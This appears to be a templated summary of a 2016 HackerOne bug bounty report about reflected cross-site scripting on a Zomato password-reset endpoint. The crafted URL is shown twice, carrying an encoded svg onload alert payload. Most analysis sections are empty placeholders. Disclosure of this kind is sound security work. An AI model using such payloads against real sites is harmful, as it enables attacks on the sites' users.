# Cross Site Scripting - type Patameter

## Metadata
- **Source:** HackerOne
- **Report:** 114151 | https://hackerone.com/reports/114151
- **Submitted:** 2016-02-02
- **Reporter:** thsa
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

Please find below crafted URL to reproduce the reflected XSS:
> https://www.zomato.com/php/fb_login_pass_reset?type=%22%3E%3Csvg/onload=alert%28document.domain%29%3E%3Ch1%3EBoooooya!!%3C/h1%3E

Access above URL (Tested on Firefox) to reproduce the issue.

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

Please find below crafted URL to reproduce the reflected XSS:
> https://www.zomato.com/php/fb_login_pass_reset?type=%22%3E%3Csvg/onload=alert%28document.domain%29%3E%3Ch1%3EBoooooya!!%3C/h1%3E

Access above URL (Tested on Firefox) to reproduce the issue.

</details>

---
*Analysed by Claude on 2026-05-24*
